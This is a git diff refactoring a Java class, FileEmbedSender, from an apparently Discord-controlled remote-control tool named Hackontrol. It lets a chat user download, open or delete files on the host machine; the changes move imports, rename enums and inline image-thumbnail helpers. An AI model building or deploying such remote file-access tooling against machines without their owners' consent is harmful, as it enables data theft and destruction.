@@ -1,6 +1,11 @@
 package com.khopan.hackontrol.channel.file;
 
 import java.awt.Desktop;
+import java.awt.Graphics2D;
+import java.awt.RenderingHints;
+import java.awt.image.BufferedImage;
+import java.awt.image.RenderedImage;
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.nio.file.Files;
 import java.nio.file.attribute.BasicFileAttributeView;
@@ -11,29 +16,30 @@ import java.util.Locale;
 import java.util.function.Consumer;
 import java.util.function.Supplier;
 
+import javax.imageio.ImageIO;
+import javax.swing.Icon;
+import javax.swing.JPanel;
 import javax.swing.filechooser.FileSystemView;
 
 import com.khopan.hackontrol.Hackontrol;
-import com.khopan.hackontrol.manager.button.ButtonContext;
-import com.khopan.hackontrol.manager.button.ButtonManager;
-import com.khopan.hackontrol.manager.button.Question;
-import com.khopan.hackontrol.manager.button.Question.OptionType;
-import com.khopan.hackontrol.manager.button.Question.QuestionResponse;
-import com.khopan.hackontrol.manager.common.IThinkable;
-import com.khopan.hackontrol.manager.common.sender.IRepliable;
-import com.khopan.hackontrol.manager.common.sender.sendable.ISendableReply;
-import com.khopan.hackontrol.manager.common.sender.sendable.MessageCreateDataSendableListener;
+import com.khopan.hackontrol.manager.interaction.ButtonContext;
+import com.khopan.hackontrol.manager.interaction.ButtonManager;
+import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
+import com.khopan.hackontrol.manager.interaction.Question;
+import com.khopan.hackontrol.manager.interaction.Question.QuestionResponse;
+import com.khopan.hackontrol.manager.interaction.Question.QuestionType;
 import com.khopan.hackontrol.utils.HackontrolButton;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.HackontrolFile;
 import com.khopan.hackontrol.utils.HackontrolFile.FileCountAndSize;
+import com.khopan.hackontrol.utils.sendable.ISendableReply;
+import com.khopan.hackontrol.utils.sendable.sender.ConsumerMessageCreateDataSendable;
 import com.khopan.hackontrol.utils.HackontrolMessage;
-import com.khopan.hackontrol.utils.ImageUtils;
 import com.khopan.hackontrol.utils.TimeSafeReplyHandler;
 
 import net.dv8tion.jda.api.EmbedBuilder;
+import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
 import net.dv8tion.jda.api.interactions.components.ItemComponent;
-import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
 import net.dv8tion.jda.api.utils.FileUpload;
 import net.dv8tion.jda.api.utils.messages.MessageCreateBuilder;
 import net.dv8tion.jda.api.utils.messages.MessageCreateData;
@@ -48,7 +54,7 @@ public class FileEmbedSender implements Runnable {
 	}
 
 	private void questionDelete(QuestionResponse response, ButtonContext context) {
-		if(!QuestionResponse.POSITIVE_RESPONSE.equals(response)) {
+		if(!QuestionResponse.POSITIVE.equals(response)) {
 			return;
 		}
 
@@ -75,7 +81,7 @@ public class FileEmbedSender implements Runnable {
 			try {
 				upload = HackontrolFile.upload(this.root);
 			} catch(Throwable Errors) {
-				HackontrolError.throwable(MessageCreateDataSendableListener.of(consumer), Errors);
+				HackontrolError.throwable(ConsumerMessageCreateDataSendable.of(consumer), Errors);
 				return;
 			}
 
@@ -98,7 +104,7 @@ public class FileEmbedSender implements Runnable {
 			return;
 		}
 
-		context.acknowledge();
+		context.deferEdit().queue();
 	}
 
 	private void buttonDeleteFile(ButtonContext context) {
@@ -106,7 +112,7 @@ public class FileEmbedSender implements Runnable {
 			return;
 		}
 
-		Question.create(context.reply(), "Are you sure you want to delete '" + this.root.getAbsolutePath() + "'?", OptionType.YES_NO, response -> this.questionDelete(response, context));
+		Question.create(context.reply(), "Are you sure you want to delete '" + this.root.getAbsolutePath() + "'?", QuestionType.YES_NO, response -> this.questionDelete(response, context));
 	}
 
 	private boolean checkFileExistence(ISendableReply reply) {
@@ -127,7 +133,7 @@ public class FileEmbedSender implements Runnable {
 		FileUpload upload;
 
 		try {
-			upload = FileUpload.fromData(ImageUtils.imageToByteArray(ImageUtils.getFileImage(this.root, 128, 128)), "icon.png");
+			upload = FileUpload.fromData(FileEmbedSender.imageToByteArray(FileEmbedSender.getFileImage(this.root, 128, 128)), "icon.png");
 		} catch(Throwable Errors) {
 			upload = null;
 		}
@@ -148,9 +154,9 @@ public class FileEmbedSender implements Runnable {
 		}
 
 		List<ItemComponent> buttonList = new ArrayList<>();
-		buttonList.add(ButtonManager.dynamicButton(ButtonStyle.SUCCESS, "Download", this :: buttonDownload));
-		buttonList.add(ButtonManager.dynamicButton(ButtonStyle.SUCCESS, "Open", this :: buttonOpen));
-		buttonList.add(ButtonManager.dynamicButton(ButtonStyle.DANGER, "Delete " + (exist && this.root.isFile() ? "File" : "Folder"), this :: buttonDeleteFile));
+		buttonList.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Download", this :: buttonDownload));
+		buttonList.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Open", this :: buttonOpen));
+		buttonList.add(ButtonManager.dynamicButton(ButtonType.DANGER, "Delete " + (exist && this.root.isFile() ? "File" : "Folder"), this :: buttonDeleteFile));
 		buttonList.add(HackontrolButton.delete());
 		messageBuilder.addActionRow(buttonList);
 		Hackontrol.LOGGER.info("File Viewer: '{}'", this.root.getAbsolutePath());
@@ -221,11 +227,81 @@ public class FileEmbedSender implements Runnable {
 		thread.start();
 	}
 
-	public static void reply(File root, IThinkable thinkable, IRepliable repliable) {
-		TimeSafeReplyHandler.start(thinkable, repliable, consumer -> FileEmbedSender.start(root, consumer));
+	public static void reply(File root, IReplyCallback callback) {
+		TimeSafeReplyHandler.start(callback, consumer -> FileEmbedSender.start(root, consumer));
 	}
 
-	public static <T extends IThinkable & IRepliable> void reply(File root, T thinkableRepliable) {
-		FileEmbedSender.reply(root, thinkableRepliable, thinkableRepliable);
+	private static BufferedImage iconToBufferedImage(Icon icon) {
+		if(icon == null) {
+			throw new NullPointerException("Icon cannot be null");
+		}
+
+		int width = icon.getIconWidth();
+		int height = icon.getIconHeight();
+		BufferedImage image = new BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB);
+		Graphics2D Graphics = image.createGraphics();
+		Graphics.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
+		icon.paintIcon(new JPanel(), Graphics, 0, 0);
+		Graphics.dispose();
+		return image;
+	}
+
+	private static byte[] imageToByteArray(RenderedImage image) {
+		if(image == null) {
+			throw new NullPointerException("Image cannot be null");
+		}
+
+		try {
+			ByteArrayOutputStream stream = new ByteArrayOutputStream();
+			ImageIO.write(image, "png", stream);
+			return stream.toByteArray();
+		} catch(Throwable Errors) {
+			throw new RuntimeException(Errors);
+		}
+	}
+
+	private static BufferedImage getFileImage(File file, int width, int height) {
+		if(file == null) {
+			throw new NullPointerException("File cannot be null");
+		}
+
+		try {
+			BufferedImage image = ImageIO.read(file);
+
+			if(image == null) {
+				throw new RuntimeException();
+			}
+
+			int imageWidth = image.getWidth();
+			int imageHeight = image.getHeight();
+			int newWidth = 0;
+			int newHeight = 0;
+
+			if(imageWidth > imageHeight) {
+				newWidth = width;
+				newHeight = (int) Math.round(((double) imageHeight) / ((double) imageWidth) * ((double) width));
+			} else {
+				newWidth = (int) Math.round(((double) imageWidth) / ((double) imageHeight) * ((double) height));
+				newHeight = height;
+			}
+
+			BufferedImage result = new BufferedImage(newWidth, newHeight, BufferedImage.TYPE_INT_ARGB);
+			Graphics2D Graphics = result.createGraphics();
+			Graphics.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
+			Graphics.drawImage(image.getScaledInstance(newWidth, newHeight, BufferedImage.SCALE_SMOOTH), 0, 0, null);
+			Graphics.dispose();
+			return result;
+		} catch(Throwable Errors) {
+
+		}
+
+		FileSystemView view = FileSystemView.getFileSystemView();
+		Icon icon = view.getSystemIcon(file, width, height);
+
+		if(icon == null) {
+			return null;
+		}
+
+		return FileEmbedSender.iconToBufferedImage(icon);
 	}
 }
